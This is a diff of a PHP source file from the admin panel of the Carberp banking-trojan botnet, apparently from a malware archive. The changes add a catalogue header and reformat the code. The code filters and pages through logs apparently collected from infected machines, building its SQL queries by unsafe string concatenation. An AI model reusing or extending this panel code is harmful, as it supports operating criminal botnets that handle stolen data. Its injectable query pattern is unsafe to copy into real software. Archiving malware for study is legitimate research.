@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 $smarty->allow_php_tag = true;
 //error_reporting(-1);
@@ -6,12 +17,14 @@ get_function('size_format');
 
 $filter = $mysqli->query('SELECT * FROM bf_filters WHERE (id = \''.$Cur['id'].'\') LIMIT 1');
 
-if($filter->id != $Cur['id']){	exit;
+if($filter->id != $Cur['id']){
+	exit;
 }
 
 $smarty->assignByRef('filter', $filter);
 
-if(is_array($_SESSION['gsearch'])){	$_POST['prefix'] = $_SESSION['gsearch']['prefix'];
+if(is_array($_SESSION['gsearch'])){
+	$_POST['prefix'] = $_SESSION['gsearch']['prefix'];
 	$_POST['mask_uid'] = $_SESSION['gsearch']['data'];
 }
 
@@ -94,7 +107,8 @@ if(!empty($_SESSION['search']['sized_' . $filter->id][3])){
 	$sql .= '(size '.$_SESSION['search']['sized_' . $filter->id][2].' \''.$_SESSION['search']['sized_' . $filter->id][3].'\')';
 }
 
-if(!empty($_SESSION['search']['mask_uid_' . $filter->id])){	if(!empty($sql)) $sql .= ' AND ';
+if(!empty($_SESSION['search']['mask_uid_' . $filter->id])){
+	if(!empty($sql)) $sql .= ' AND ';
 	$_POST['mask_uid'] = $_SESSION['search']['mask_uid_' . $filter->id];
 	$sql .= '(uid LIKE \''.$_SESSION['search']['mask_uid_' . $filter->id].'%\')';
 }
@@ -122,8 +136,11 @@ if(!empty($_SESSION['search']['type_' . $filter->id])){
 	$_POST['gra_fields'] = $_SESSION['search']['gra_fields_' . $filter->id];
 	$_POST['fgr_fields'] = $_SESSION['search']['fgr_fields_' . $filter->id];
 
-	if($_POST['type'] == '5' && !empty($_POST['fgr_fields'])){		$fgr_fields = explode(',', $_SESSION['search']['fgr_fields_' . $filter->id]);
-		if(count($fgr_fields) > 0){			foreach($fgr_fields as $it){				if(!empty($it)) $sql .= ' AND (fields LIKE \'%'.$it.',%\')';
+	if($_POST['type'] == '5' && !empty($_POST['fgr_fields'])){
+		$fgr_fields = explode(',', $_SESSION['search']['fgr_fields_' . $filter->id]);
+		if(count($fgr_fields) > 0){
+			foreach($fgr_fields as $it){
+				if(!empty($it)) $sql .= ' AND (fields LIKE \'%'.$it.',%\')';
 			}
 		}
 	}elseif($_POST['type'] == '6' && !empty($_POST['gra_fields'])){
@@ -141,17 +158,24 @@ if($_SESSION['search']['status_' . $filter->id] == 'nuls'){
 	if(!empty($sql)) $sql .= ' AND ';
 	$sql .= '(save=\'0\')';
 	$_POST['status'] = $_SESSION['search']['status_' . $filter->id];
-}elseif($_SESSION['search']['status_' . $filter->id] == '1'){	if(!empty($sql)) $sql .= ' AND ';
+}elseif($_SESSION['search']['status_' . $filter->id] == '1'){
+	if(!empty($sql)) $sql .= ' AND ';
 	$sql .= '(save!=\'0\')';
 	$_POST['status'] = $_SESSION['search']['status_' . $filter->id];
 }
 
 if(!empty($_SESSION['search']['data1_' . $filter->id]) && !empty($_SESSION['search']['data2_' . $filter->id])){
-	if($_SESSION['search']['data1_' . $filter->id] != 'ALL' && $_SESSION['search']['data2_' . $filter->id] != 'ALL'){		if(!empty($sql)) $sql .= ' AND ';
-		if($_SESSION['search']['data1_' . $filter->id] == $_SESSION['search']['data2_' . $filter->id]){			$sql .= '(post_date > \''.$_SESSION['search']['data1_' . $filter->id].' 00:00:00\')';
-		}else{			if($_SESSION['search']['data1_' . $filter->id] == 'ALL'){				$sql .= '(post_date < \''.$_SESSION['search']['data2_' . $filter->id].' 23:59:59\')';
-			}elseif($_SESSION['search']['data2_' . $filter->id] == 'ALL'){				$sql .= '(post_date > \''.$_SESSION['search']['data1_' . $filter->id].' 00:00:00\')';
-			}else{				$sql .= '(post_date > \''.$_SESSION['search']['data1_' . $filter->id].' 00:00:00\') AND (post_date < \''.$_SESSION['search']['data2_' . $filter->id].' 23:59:59\')';
+	if($_SESSION['search']['data1_' . $filter->id] != 'ALL' && $_SESSION['search']['data2_' . $filter->id] != 'ALL'){
+		if(!empty($sql)) $sql .= ' AND ';
+		if($_SESSION['search']['data1_' . $filter->id] == $_SESSION['search']['data2_' . $filter->id]){
+			$sql .= '(post_date > \''.$_SESSION['search']['data1_' . $filter->id].' 00:00:00\')';
+		}else{
+			if($_SESSION['search']['data1_' . $filter->id] == 'ALL'){
+				$sql .= '(post_date < \''.$_SESSION['search']['data2_' . $filter->id].' 23:59:59\')';
+			}elseif($_SESSION['search']['data2_' . $filter->id] == 'ALL'){
+				$sql .= '(post_date > \''.$_SESSION['search']['data1_' . $filter->id].' 00:00:00\')';
+			}else{
+				$sql .= '(post_date > \''.$_SESSION['search']['data1_' . $filter->id].' 00:00:00\') AND (post_date < \''.$_SESSION['search']['data2_' . $filter->id].' 23:59:59\')';
 			}
 		}
 	}
@@ -163,7 +187,8 @@ if(!empty($sql)) $sql = ' WHERE ' . $sql;
 //print_rm($_POST);
 $table_check = $mysqli->table_check('bf_filter_'.$filter->id);
 
-if($table_check->Name != 'bf_filter_'.$filter->id){	print('<hr /><div align="center" style="font-size: 16px; font-weight:bold">'.$lang['tfensdsi'].'</div><hr />');
+if($table_check->Name != 'bf_filter_'.$filter->id){
+	print('<hr /><div align="center" style="font-size: 16px; font-weight:bold">'.$lang['tfensdsi'].'</div><hr />');
 	exit;
 }else{
 	$logs = $mysqli->query('SELECT * FROM bf_filter_' . $filter->id . $sql . ' ORDER by post_date DESC LIMIT ' . ($Cur['page'] == 0 ? 0 : $Cur['page']*$_SESSION['user']->config['cp']['filters']).','.$_SESSION['user']->config['cp']['filters'], null, null, false);
@@ -186,7 +211,8 @@ if($table_check->Name != 'bf_filter_'.$filter->id){	print('<hr /><div align="ce
     $img_p = scandir('templates/images/b/');
     unset($img_p[0], $img_p[1]);
     $imgp = array();
-    foreach($img_p as $file){    	$imgp[str_replace('.png', '', $file)] = true;
+    foreach($img_p as $file){
+    	$imgp[str_replace('.png', '', $file)] = true;
     }
     $smarty->assign('imgp', $imgp);
 
